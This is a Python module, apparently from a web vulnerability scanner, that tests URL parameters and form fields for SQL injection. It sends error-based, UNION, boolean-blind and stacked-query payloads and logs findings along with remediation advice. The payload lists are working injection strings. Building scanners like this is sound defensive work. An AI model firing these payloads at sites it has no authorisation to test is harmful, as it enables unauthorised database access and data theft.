from __future__ import annotations
from urllib.parse import urlparse
from .base import BaseModule
from ..scanner import Finding, HIGH, mutate_query, SQL_ERRORS

class SQLInjectionModule(BaseModule):
    name = "SQL Injection"
    category = "Injection"

    def run(self):
        for url in list(self.scanner.pages):
            self._check_url(url)
        for form in self.scanner.forms:
            self._check_form(form)

    def _check_url(self, url):
        from urllib.parse import parse_qsl
        params = list(dict(parse_qsl(urlparse(url).query, keep_blank_values=True)).keys())
        for param in params:
            if self._test_error_based(url, param, "GET"): continue
            if self._test_union_based(url, param, "GET"): continue
            if self._test_boolean_based(url, param, "GET"): continue
            self._test_stacked_queries(url, param, "GET")

    def _check_form(self, form):
        for param in form.inputs:
            if self._test_error_based(form.action, param, form.method, form.inputs): continue
            if self._test_union_based(form.action, param, form.method, form.inputs): continue
            if self._test_boolean_based(form.action, param, form.method, form.inputs): continue
            self._test_stacked_queries(form.action, param, form.method, form.inputs)

    def _test_error_based(self, url, param, method, base_data=None):
        payloads = [
            "'", "\"", "')", "\")", "'))", "\"))",
            "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--",
            "' OR 1=1#", "\" OR 1=1#",
            "\\", "%%", "%' OR '1'='1",
            "')) OR 1=1--",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
        ]
        baseline = self.scanner.pages.get(url)
        baseline_text = baseline.text.lower() if baseline else ""

        for payload in payloads:
            res = self._send_payload(url, param, method, payload, base_data)
            if not res:
                continue
            res_text = res.text.lower()
            for error in SQL_ERRORS:
                if error in res_text and error not in baseline_text:
                    self._report(url, param, method, payload, f"New SQL error message appeared in response: {error}")
                    return True

    def _send_payload(self, url, param, method, payload, base_data=None):
        if method == "GET":
            return self.scanner._request("GET", mutate_query(url, param, payload))
        else:
            data = dict(base_data) if base_data else {}
            data[param] = payload
            return self.scanner._request("POST", url, data=data)

    def _test_union_based(self, url, param, method, base_data=None):
        payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3,4,5--",
            "') UNION SELECT NULL,NULL,NULL--",
        ]
        baseline = self._send_payload(url, param, method, "union_baseline_xploit", base_data)
        baseline_text = baseline.text.lower() if baseline else ""

        for payload in payloads:
            res = self._send_payload(url, param, method, payload, base_data)
            if not res:
                continue
            res_lower = res.text.lower()
            new_sql_error = any(e in res_lower and e not in baseline_text for e in SQL_ERRORS)
            if new_sql_error:
                self._report(url, param, method, payload,
                             "Union-based SQLi: SQL error appeared in response to UNION payload")
                return True

    def _test_boolean_based(self, url, param, method, base_data=None):
        true_payloads  = ["' AND '1'='1", "' AND 1=1--", "') AND ('1'='1"]
        false_payloads = ["' AND '1'='2", "' AND 1=2--", "') AND ('1'='2"]

        baseline = self._send_payload(url, param, method, "bool_baseline_xploit", base_data)
        baseline_len = len(baseline.text) if baseline else 0

        for true_p, false_p in zip(true_payloads, false_payloads):
            true_res  = self._send_payload(url, param, method, true_p, base_data)
            false_res = self._send_payload(url, param, method, false_p, base_data)
            if not true_res or not false_res:
                continue
            true_len  = len(true_res.text)
            false_len = len(false_res.text)
            true_near_baseline = baseline_len > 0 and abs(true_len - baseline_len) < 150
            significant_diff   = abs(true_len - false_len) > 200
            if true_near_baseline and significant_diff:
                self._report(url, param, method, true_p,
                             f"Boolean-based blind SQLi: TRUE({true_len}B) vs FALSE({false_len}B) — {abs(true_len - false_len)}B delta")
                return True

    def _test_stacked_queries(self, url, param, method, base_data=None):
        payloads = [
            "'; EXEC sp_MSforeachtable 'SELECT 1'--",
            "1; SELECT COUNT(*) FROM information_schema.tables--",
        ]
        baseline = self.scanner.pages.get(url)
        baseline_text = baseline.text.lower() if baseline else ""

        for payload in payloads:
            res = self._send_payload(url, param, method, payload, base_data)
            if not res:
                continue
            indicators = ["multiple statements", "syntax near", "expects parameter"]
            text_lower = res.text.lower()
            if any(ind in text_lower and ind not in baseline_text for ind in indicators):
                self._report(url, param, method, payload,
                             "Stacked queries SQLi: Error response suggests multiple statement support")
                return True

    def _report(self, url, param, method, payload, evidence):
        ev_lower = evidence.lower()
        if "union" in ev_lower:
            sqli_type, finding_id = "Union-based SQL Injection", "SQLI-003"
        elif "boolean" in ev_lower:
            sqli_type, finding_id = "Boolean-based Blind SQL Injection", "SQLI-004"
        elif "stacked" in ev_lower:
            sqli_type, finding_id = "Stacked Queries SQL Injection", "SQLI-005"
        else:
            sqli_type, finding_id = "SQL Injection", "SQLI-001"

        self.add_finding(Finding(
            id=finding_id,
            name=sqli_type,
            category="SQL Injection",
            severity=HIGH,
            confidence="High",
            url=url,
            parameter=param,
            method=method,
            evidence=evidence,
            trigger=f"payload={payload}",
            impact="If confirmed, SQL injection allows attackers to read, modify, or delete database records — leading to authentication bypass, data theft, or full system compromise.",
            remediation="Use parameterized queries, prepared statements, and input validation. Never concatenate user input into SQL queries.",
            cwe="CWE-89"
        ))
